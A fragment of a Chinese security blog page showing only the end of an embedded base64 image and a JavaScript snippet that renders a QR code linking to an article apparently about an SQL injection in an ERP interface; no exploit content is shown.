tZz3ED1yfQ24v9rV9y3JaZ9j33/3m4WPqgPL2pxYVgPfbJv8sjuv3Wph76+0+dZj9+syvuLrY/epiz8sLt4FovvC5J7AbCOSWwIyrbUJ8PV/THqPn5aOnntXPELIu7NHa6lch71i5ipUOc2998JgO8VlXa1XIYc6XvhtIiVc87wSeNhDY346jY4D46maNoXfUfDbXEdILjtF6SN76M7375GKvh/Q/0p82EDd74XwCXx6IU7atHHIL1EWIrm+lmxf1iSu98ubgeK3yVOgTIf7KjQHR9YmjZ3zueUi9np5XL/zyQKrJFd93AruBOL2OZ0tCbgEErV/VQXwQ7D6YdZh5948cjr19TxAfBHvenuoQHwR7Xg7JW6cuh+QhaL5wN5ASr3jeCWwDgUwL7uNqq06/52Hu1/PWiRC/vPsheVijNfaAeLtuXh3iUxfhWLeuo3Xqcjjvsw3E4gufewLXQJ57/rvV/wMAAP//ZebkHQAAAAZJREFUAwA5IzG25RU19wAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 